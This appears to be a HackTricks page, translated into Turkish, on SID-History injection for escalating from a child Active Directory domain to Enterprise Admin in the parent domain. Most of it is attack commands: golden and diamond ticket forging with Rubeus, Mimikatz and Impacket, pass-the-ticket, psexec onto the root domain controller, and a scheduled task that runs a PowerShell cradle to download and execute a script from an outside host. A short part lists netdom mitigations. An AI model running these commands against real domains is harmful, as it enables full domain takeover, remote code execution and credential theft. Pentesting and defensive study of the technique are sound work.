# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack**'ın odak noktası, **kullanıcıların alanlar arasında göçünü** sağlarken, eski alan kaynaklarına erişimin devamını temin etmektir. Bu, kullanıcının önceki Güvenlik Tanımlayıcısının (SID) yeni hesabının SID Geçmişine **dahil edilmesiyle** gerçekleştirilir. Özellikle, bu süreç, ana alandan yüksek ayrıcalıklı bir grubun (örneğin, Enterprise Admins veya Domain Admins) SID'sini SID Geçmişine ekleyerek yetkisiz erişim sağlamak için manipüle edilebilir. Bu istismar, ana alandaki tüm kaynaklara erişim sağlar.

Bu saldırıyı gerçekleştirmek için iki yöntem vardır: ya bir **Golden Ticket** ya da bir **Diamond Ticket** oluşturmak.

**"Enterprise Admins"** grubunun SID'sini belirlemek için, önce kök alanın SID'sini bulmak gerekir. Tanımlamanın ardından, Enterprise Admins grup SID'si kök alanın SID'sine `-519` eklenerek oluşturulabilir. Örneğin, kök alan SID'si `S-1-5-21-280534878-1496970234-700767426` ise, "Enterprise Admins" grubunun sonuçta elde edilen SID'si `S-1-5-21-280534878-1496970234-700767426-519` olacaktır.

Ayrıca, **512** ile biten **Domain Admins** gruplarını da kullanabilirsiniz.

Diğer bir alanın (örneğin "Domain Admins") grubunun SID'sini bulmanın bir başka yolu:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> SID geçmişini bir güven ilişkisi içinde devre dışı bırakmanın bu saldırının başarısız olmasına neden olabileceğini unutmayın.

[**docs**](https://technet.microsoft.com/library/cc835085.aspx) göre:
- **Orman güvenlerinde SIDHistory'yi devre dışı bırakma** netdom aracı kullanılarak (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Dış güvenlere SID Filtreleme Karantinası uygulama** netdom aracı kullanılarak (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Tek bir orman içindeki alan güvenlerine SID Filtreleme uygulamak** önerilmez çünkü bu desteklenmeyen bir yapılandırmadır ve kırıcı değişikliklere neden olabilir. Eğer bir orman içindeki bir alan güvenilir değilse, o ormanın üyesi olmamalıdır. Bu durumda, güvenilir ve güvenilir olmayan alanların ayrı ormanlara bölünmesi ve burada SID Filtrelemenin bir interforest güvenine uygulanması gereklidir.

Bununla ilgili daha fazla bilgi için bu gönderiyi kontrol edin: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Bunu en son denediğimde **`/ldap`** argümanını eklemem gerekti.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) ile KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Daha fazla bilgi için golden ticket'lar hakkında kontrol edin:

{{#ref}}
golden-ticket.md
{{#endref}}


Daha fazla bilgi için diamond ticket'lar hakkında kontrol edin:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Kompromize edilmiş alanın KRBTGT hash'ini kullanarak kök veya Enterprise admin'e yükseltin:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Elde edilen izinlerle, yeni alanda örneğin bir DCSync saldırısı gerçekleştirebilirsiniz:

{{#ref}}
dcsync.md
{{#endref}}

### Linux'tan

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) ile Manuel
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Bu, **çocuk alanından ebeveyn alanına yükseltmeyi otomatikleştiren** bir Impacket betiğidir. Betik şunları gerektirir:

- Hedef alan denetleyicisi
- Çocuk alanındaki bir yönetici kullanıcısı için kimlik bilgileri

Akış şudur:

- Ebeveyn alanının Enterprise Admins grubunun SID'sini alır
- Çocuk alanındaki KRBTGT hesabının hash'ini alır
- Bir Golden Ticket oluşturur
- Ebeveyn alanına giriş yapar
- Ebeveyn alanındaki Administrator hesabı için kimlik bilgilerini alır
- Eğer `target-exec` anahtarı belirtilmişse, Psexec aracılığıyla ebeveyn alanının Alan Denetleyicisi'ne kimlik doğrulaması yapar.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referanslar

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
